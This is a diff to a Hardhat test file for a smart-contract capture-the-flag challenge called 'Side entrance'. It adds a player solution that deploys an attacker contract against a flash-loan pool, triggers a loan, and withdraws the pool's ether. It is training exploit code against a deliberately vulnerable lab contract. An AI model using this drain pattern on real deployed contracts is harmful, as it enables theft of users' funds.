@@ -1,6 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
+const { parseEther } = require('ethers/lib/utils');
 
 describe('[Challenge] Side entrance', function () {
     let deployer, player;
@@ -26,6 +27,10 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attacker = await (await ethers.getContractFactory("contracts/side-entrance/IFlashLoanEtherReceiver.sol:IFlashLoanEtherReceiver", player)).deploy(pool.address, player.address);
+
+        await attacker.callLoan();
+        await attacker.connect(player).withdraw();
     });
 
     after(async function () {
